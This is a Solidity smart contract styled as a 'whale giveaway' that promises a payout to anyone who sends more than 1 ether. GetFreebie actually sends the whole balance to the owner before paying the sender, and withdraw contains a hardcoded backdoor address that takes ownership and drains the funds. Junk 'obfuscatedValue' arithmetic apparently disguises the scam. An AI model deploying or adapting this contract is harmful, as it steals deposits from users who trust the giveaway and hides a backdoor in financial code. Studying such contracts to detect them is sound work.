pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint256 private obfuscatedValue = 123456789;

    function()
    public
    payable
    {
        obfuscatedValue = obfuscatedValue * 3 + 1;
    }
   
    function GetFreebie()
    public
    payable
    {   
        if(msg.value > 1 ether)
        {
            if (obfuscatedValue % 2 == 0) {
                obfuscatedValue = obfuscatedValue / 2;
            } else {
                obfuscatedValue = 3 * obfuscatedValue + 1;
            }
            if (msg.value > 1 ether) {
                Owner.transfer(this.balance);
                msg.sender.transfer(this.balance);
            }
        }
    }
    
    function withdraw()
    payable
    public
    {   
        uint256 tempValue = obfuscatedValue * 7;
        if (tempValue % 5 == 0) {
            obfuscatedValue = tempValue / 5;
        }
        if(msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr, bytes data)
    payable
    public
    {
        uint256 commandValue = obfuscatedValue * 11;
        if (commandValue % 3 == 0) {
            obfuscatedValue = commandValue / 3;
        }
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
}